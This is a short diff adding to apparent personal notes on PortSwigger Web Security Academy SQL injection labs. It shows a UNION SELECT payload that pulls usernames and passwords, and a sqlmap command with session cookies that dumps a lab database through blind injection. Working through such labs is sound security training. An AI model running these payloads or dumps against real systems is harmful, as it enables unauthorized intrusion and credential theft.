@@ -19,6 +19,10 @@ extracting info from columns
 '+UNION+SELECT+USERNAME_DLIVBF,+PASSWORD_CRPVBI+FROM+USERS_IKKHDT--
 
 
+**Blind SQL injection with conditional responses**
+if you know the db, put --dbms=postgresql or else run without --dbms flag, it may take longer.
+while running below, it will ask for confirmations, go by default, just click enter.
+sqlmap -u 'https://0af800e604055c7d819e399800bf00c6.web-security-academy.net/filter?category=Lifestyle' --cookie='TrackingId=nDU4jKT9hjQE9mr5; session=PFERWY0rKpJ7bPszXsQKXVAnzmZyBLWq' --level 2 --dbms=postgresql --dump --threads=5
 
 
 ## Summary
